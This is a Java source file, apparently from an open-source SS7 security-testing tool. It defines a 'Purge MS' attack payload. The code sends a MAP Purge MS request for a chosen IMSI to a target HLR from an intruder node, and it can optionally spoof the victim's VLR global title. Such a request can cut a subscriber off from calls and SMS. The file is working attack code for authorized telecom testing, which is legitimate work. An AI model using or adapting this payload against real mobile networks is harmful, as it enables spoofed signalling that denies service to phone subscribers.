/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.connectivity.ss7.payloadwrapper.mobility;

import com.rodan.connectivity.ss7.adapter.MapAdapter;
import com.rodan.connectivity.ss7.adapter.SccpAdapter;
import com.rodan.connectivity.ss7.payloadwrapper.JSs7PayloadWrapper;
import com.rodan.connectivity.ss7.service.MapDialogGenerator;
import com.rodan.connectivity.ss7.service.MapMobilityService;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Payload;
import com.rodan.library.model.config.node.config.IntruderNodeConfig;
import com.rodan.library.model.config.node.config.NodeConfig;
import com.rodan.library.model.error.ErrorCode;
import com.rodan.library.model.error.SystemException;
import lombok.AccessLevel;
import lombok.Builder;
import lombok.Getter;
import lombok.ToString;
import org.apache.commons.lang3.StringUtils;
import org.mobicents.protocols.ss7.indicator.RoutingIndicator;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContext;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContextName;
import org.mobicents.protocols.ss7.map.api.MAPException;
import org.mobicents.protocols.ss7.map.api.primitives.AddressNature;
import org.mobicents.protocols.ss7.map.api.service.mobility.MAPDialogMobility;

@Payload(name = Constants.PURGE_MS_PAYLOAD_NAME)
@ToString(callSuper = true)
public class PurgeMsPayloadWrapper extends JSs7PayloadWrapper<MapMobilityService, MAPDialogMobility> {
    @Getter(AccessLevel.PRIVATE) private String imsi;
    @Getter(AccessLevel.PRIVATE) private String msisdn;
    @Getter(AccessLevel.PRIVATE) private String targetHlrGt;
    @Getter(AccessLevel.PRIVATE) private String spoofVlr;
    @Getter(AccessLevel.PRIVATE) private String targetVlrGt;
    @Getter(AccessLevel.PRIVATE) private String mapVersion;

    @Builder
    public PurgeMsPayloadWrapper(String localGt, int localSsn, int remoteSsn, NodeConfig nodeConfig, 
                                 SccpAdapter sccpAdapter, MapAdapter mapAdapter, 
                                 MapDialogGenerator<MAPDialogMobility> dialogGenerator, String imsi, String msisdn, 
                                 String targetHlrGt, String spoofVlr, String targetVlrGt, String mapVersion) {
        super(localGt, localSsn, remoteSsn, nodeConfig, sccpAdapter, mapAdapter, dialogGenerator);
        this.imsi = imsi;
        this.msisdn = msisdn;
        this.targetHlrGt = targetHlrGt;
        this.spoofVlr = spoofVlr;
        this.targetVlrGt = targetVlrGt;
        this.mapVersion = mapVersion;
    }

    @Override
    public MAPDialogMobility generateCarrier() throws SystemException {
        validate();

        var sccpFactory = getSccpAdapter().getParamFactory();
        //  TODO check if spoofing is required (HLR may reject Purge if VLR is not the current VLR
        var callingStr = "Yes".equalsIgnoreCase(getSpoofVlr()) ?
                getTargetVlrGt() : getLocalGt();
        var callingGt = sccpFactory.createGlobalTitle(callingStr,
                TRANSLATION_TYPE, ISDN_TELEPHONY_INDICATOR, ENCODING_SCHEME, NATURE_OF_ADDRESS);
        var callingPc = Integer.valueOf(getNodeConfig().getSs7Association().getLocalNode().getPointCode());
        var callingParty = sccpFactory.createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, callingGt,
                callingPc, getLocalSsn());
        var calledGtStr = StringUtils.isBlank(getTargetHlrGt()) ? getMsisdn() :
                getTargetHlrGt();
        var calledGt = sccpFactory.createGlobalTitle(calledGtStr, TRANSLATION_TYPE, ISDN_TELEPHONY_INDICATOR,
                ENCODING_SCHEME, NATURE_OF_ADDRESS);
        var calledPc = Integer.valueOf(((IntruderNodeConfig) getNodeConfig()).getSs7Association().getPeerNode().getPointCode());
        var calledParty = sccpFactory.createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, calledGt,
                calledPc, getRemoteSsn());

        return dialogGenerator.generate(callingParty, calledParty, getApplicationContext());
    }

    @Override
    public void addToCarrier(MAPDialogMobility dialog) throws SystemException {
        try {
            validate();

            var mapFactory = getMapAdapter().getParamFactory();
            var imsi = mapFactory.createIMSI(getImsi());
            var vlrGt = StringUtils.isBlank(getTargetVlrGt())? getLocalGt() : getTargetVlrGt();
            var vlr = mapFactory.createISDNAddressString(AddressNature.international_number,
                    org.mobicents.protocols.ss7.map.api.primitives.NumberingPlan.ISDN, vlrGt);

            dialog.addPurgeMSRequest(imsi, vlr, null, null);

        } catch (MAPException e) {
            logger.error("Failed to add CL to dialog", e);
            throw SystemException.builder().code(ErrorCode.MAP_INITIALIZATION).build();
        }
    }

    @Override
    protected MAPApplicationContext getApplicationContext() throws SystemException {
        Integer[] supportedVersions = {2, 3};
        var mapContextVersion = getAcVersion(Integer.parseInt(getMapVersion()), supportedVersions);
        return MAPApplicationContext.getInstance(MAPApplicationContextName.msPurgingContext, mapContextVersion);
    }
}
